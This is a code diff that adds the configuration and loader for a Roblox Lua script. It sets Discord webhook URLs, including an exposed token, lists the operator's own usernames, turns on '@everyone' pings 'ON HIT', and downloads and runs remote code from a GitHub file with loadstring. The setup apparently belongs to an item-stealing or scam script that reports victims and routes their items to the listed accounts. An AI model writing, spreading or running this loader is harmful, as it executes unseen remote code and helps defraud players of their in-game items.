@@ -1,0 +1,11 @@
+-- SETTINGS
+_G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1504862328712200394/g6IxmJJRS9acjYZWXczd6wdk1kdYaEuh-u9UEf5RGCFLzSBh-H-XwncrMztTZP-MFmGU" -- Input Ur webhook Here
+_G.RICH_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1504862328712200394/g6IxmJJRS9acjYZWXczd6wdk1kdYaEuh-u9UEf5RGCFLzSBh-H-XwncrMztTZP-MFmGU" -- Input Ur webhook Here
+_G.MY_USERNAMES = {"Tocinito_YY", "Tocinita_YY", "X"} -- YOUR own usernames
+_G.PING_POOR = true -- True/False To Ping @Everyone ON HIT
+_G.PING_RICH = true -- True/False To Ping @Everyone ON HIT
+
+-- Load Main
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/freemium.lua", true))()
+end)
